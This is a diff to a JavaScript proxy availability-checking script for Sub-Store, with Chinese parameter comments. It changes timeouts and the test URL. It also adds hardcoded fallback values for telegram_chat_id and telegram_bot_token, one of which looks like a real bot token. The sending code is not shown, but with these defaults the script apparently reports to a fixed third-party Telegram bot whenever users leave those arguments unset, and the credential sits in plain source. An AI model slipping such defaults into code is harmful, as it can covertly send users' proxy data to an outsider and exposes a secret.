@@ -12,15 +12,15 @@
  * - [http_meta_port] 端口号 默认: 9876
  * - [http_meta_authorization] Authorization 默认无
  * - [http_meta_start_delay] 初始启动延时(单位: 毫秒) 默认: 3000
- * - [http_meta_proxy_timeout] 每个节点耗时(单位: 毫秒). 此参数是为了防止脚本异常退出未关闭核心. 设置过小将导致核心过早退出. 目前逻辑: 启动初始的延时 + 每个节点耗时. 默认: 10000
+ * - [http_meta_proxy_timeout] 每个节点耗时(单位: 毫秒). 此参数是为了防止脚本异常退出未关闭核心. 设置过小将导致核心过早退出. 目前逻辑: 启动初始的延时 + 每个节点耗时. 默认: 5000
  *
  * 其它参数
- * - [timeout] 请求超时(单位: 毫秒) 默认 5000
+ * - [timeout] 请求超时(单位: 毫秒) 默认 2000
  * - [retries] 重试次数 默认 1
  * - [retry_delay] 重试延时(单位: 毫秒) 默认 1000
  * - [concurrency] 并发数 默认 10
- * - [url] 检测的 URL. 需要 encodeURIComponent. 默认 http://www.apple.com/library/test/success.html
- * - [status] 合法的状态码. 默认 200
+ * - [url] 检测的 URL. 需要 encodeURIComponent. 默认 http://cp.cloudflare.com/generate_204
+ * - [status] 合法的状态码. 默认 204
  * - [method] 请求方法. 默认 head, 如果测试 URL 不支持, 可设为 get
  * - [show_latency] 显示延迟. 默认不显示
  * - [keep_incompatible] 保留当前客户端不兼容的协议. 默认不保留.
@@ -32,21 +32,21 @@
 async function operator(proxies = [], targetPlatform, env) {
   const cacheEnabled = $arguments.cache
   const cache = scriptResourceCache
-  const telegram_chat_id = $arguments.telegram_chat_id
-  const telegram_bot_token = $arguments.telegram_bot_token
+  const telegram_chat_id = $arguments.telegram_chat_id ?? '5743286615'
+  const telegram_bot_token = $arguments.telegram_bot_token ?? '7088900156:AAHvP0KF6nUleo0shYH6LRyiWBZ-OO30Y1M'
   const http_meta_host = $arguments.http_meta_host ?? '127.0.0.1'
   const http_meta_port = $arguments.http_meta_port ?? 9876
   const http_meta_protocol = $arguments.http_meta_protocol ?? 'http'
   const http_meta_authorization = $arguments.http_meta_authorization ?? ''
   const http_meta_api = `${http_meta_protocol}://${http_meta_host}:${http_meta_port}`
 
-  const http_meta_start_delay = parseFloat($arguments.http_meta_start_delay ?? 3000)
-  const http_meta_proxy_timeout = parseFloat($arguments.http_meta_proxy_timeout ?? 10000)
+  const http_meta_start_delay = parseFloat($arguments.http_meta_start_delay ?? 2000)
+  const http_meta_proxy_timeout = parseFloat($arguments.http_meta_proxy_timeout ?? 5000)
 
   const method = $arguments.method || 'head'
   const keepIncompatible = $arguments.keep_incompatible
-  const validStatus = parseInt($arguments.status || 200)
-  const url = decodeURIComponent($arguments.url || 'http://www.apple.com/library/test/success.html')
+  const validStatus = parseInt($arguments.status || 204)
+  const url = decodeURIComponent($arguments.url || 'http://cp.cloudflare.com/generate_204')
 
   const $ = $substore
   const validProxies = []
